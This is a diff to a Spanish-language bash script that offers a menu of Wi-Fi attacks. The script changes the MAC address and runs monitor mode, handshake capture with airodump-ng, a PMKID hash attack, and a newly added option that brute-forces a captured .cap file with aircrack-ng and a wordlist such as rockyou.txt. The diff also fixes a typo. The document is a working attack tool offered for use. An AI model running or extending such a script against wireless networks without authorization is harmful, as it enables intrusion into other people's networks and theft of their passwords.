@@ -71,11 +71,14 @@ if [ $airtest -eq 0 ] && [ $xtermtest -eq 0 ] && [ $macctest -eq 0 ]; then
 							echo -e "${blueColour}[+] Direccion MAC: $(macchanger --show ${tar}mon | grep "Current MAC" | awk '{print $3}')"
 							echo -e "${yellowColour}\n1) Ataque Handshake"
 							echo -e "2) Ataque PKMID"
-							echo -e "3) Salir"
+							echo -e "3) Ataque de fuerza bruta"
+							echo -e "4) Salir"
 							echo -e "${greenColour}"; read -p "Selecciona una opción: " opcion
 							$cleancolor
 							case $opcion in
 								1)
+								echo -e "\n${turquoiseColour}[*] Iniciando Ataque Handshake"
+								sleep 1
 								xterm -hold -e "airodump-ng ${tar}mon" &
 								airodump_xterm_PID=$!
 								echo -e "$grayColour"
@@ -126,7 +129,7 @@ if [ $airtest -eq 0 ] && [ $xtermtest -eq 0 ] && [ $macctest -eq 0 ]; then
 								hcxcaptool -z Hashes Hash; rm Hash 2>/dev/null
 								test -f  Hashes
 								if [ "$(echo $?)" == "0" ]; then
-									echo -e "\n${yellowColour}[*] Inicianndo ataque de fuerza bruta"
+									echo -e "\n${yellowColour}[*] Iniciando ataque de fuerza bruta"
 									sleep 1
 									echo -e "\n${blueColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
 									read -p "[?] Ruta del Diccionario al usar: " dicc1
@@ -137,6 +140,15 @@ if [ $airtest -eq 0 ] && [ $xtermtest -eq 0 ] && [ $macctest -eq 0 ]; then
 								fi
 								;;
 								3)
+								echo -e "\n${greenColour}[*] Iniciando Ataque de Fuerza Bruta"
+								sleep 1
+								echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
+									$cleancolor
+									read -p "[?] Nombre del archivo .cap: " cap
+									read -p "[?] Ruta del Diccionario al usar: " dicc
+									xterm -hold -e "aircrack-ng -w $dicc $cap"
+								;;
+								4)
 								echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
 								airmon-ng stop ${tar}mon > /dev/null 2>&1
 								sudo /etc/init.d/networking start > /dev/null 2>&1
